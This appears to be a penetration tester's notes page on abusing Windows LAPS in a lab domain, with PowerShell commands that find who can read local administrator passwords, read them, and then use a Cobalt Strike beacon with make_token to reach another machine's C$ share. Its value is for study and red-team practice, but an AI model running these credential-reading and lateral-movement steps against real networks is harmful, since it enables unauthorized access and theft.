
## [[Local Administrator Password Solution (LAPS)]]
> Import-Module -Name AdmPwd.PS -SkipEditionCheck  
> Get-AdmPwdPassword - ComputerName $env:COMPUTERNAME

### Find principals allowed to read PW
`Find-AdmPwdExtendedRights` will list the principals allowed to read the LAPS password for machines in the given OU.
```ps
Find-AdmPwdExtendedRights -Identity Workstations | fl

ObjectDN             : OU=Workstations,DC=edu,DC=evil,DC=corp
ExtendedRightHolders : {NT AUTHORITY\SYSTEM, EDU\Domain Admins, EDU\1st Line Support}
```

Alternative: [[PowerView#Get principals can read LAPS PW]]


### Read LAPS PW
Since Domain Admins can read all the LAPS password attributes, `Get-AdmPwdPassword` will do just that.
```ps
Get-AdmPwdPassword -ComputerName wkstn2 | fl

ComputerName        : WKSTN2
DistinguishedName   : CN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp
Password            : WRSZV43u16qkc1
ExpirationTimestamp : 5/20/2022 12:57:36 PM
```

Alternatives: [[PowerView#Show DomainObject]]

### Use LAPS PW
```beacon
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn2 | fl

ComputerName        : WKSTN2
DistinguishedName   : CN=WKSTN2,OU=Workstations,DC=edu,DC=evil,DC=corp
Password            : password123.
ExpirationTimestamp : 3/23/2022 5:18:43 PM

beacon> rev2self
beacon> make_token .\lapsadmin password123.
beacon> ls \\wkstn2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 dir     05/19/2022 14:35:19   $Recycle.Bin
 dir     05/10/2022 03:23:44   Boot
```